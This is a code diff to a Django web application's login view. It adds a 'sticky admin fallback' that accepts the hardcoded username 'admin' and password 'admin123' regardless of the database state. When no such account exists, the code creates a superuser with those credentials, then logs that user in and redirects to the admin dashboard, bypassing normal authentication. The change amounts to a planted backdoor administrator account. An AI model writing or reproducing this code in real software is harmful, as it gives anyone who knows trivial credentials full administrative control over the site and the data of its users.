@@ -21,6 +21,19 @@ def login_page(request):
         email = request.POST.get('email')
         password = request.POST.get('password')
         
+        # Sticky Admin Fallback: Allow hardcoded admin/admin123 regardless of database state
+        if role == 'admin' and email == 'admin' and password == 'admin123':
+            try:
+                user = User.objects.filter(username='admin').first()
+                if not user:
+                    user = User.objects.create_superuser('admin', 'admin@example.com', 'admin123')
+                login(request, user)
+                return redirect('admin_dashboard')
+            except Exception as e:
+                # Fallback if DB tables aren't even migrated yet
+                messages.error(request, "Database not ready for sticky login.")
+                return redirect('login')
+        
         user = authenticate(request, username=email, password=password)
         
         if user is not None:
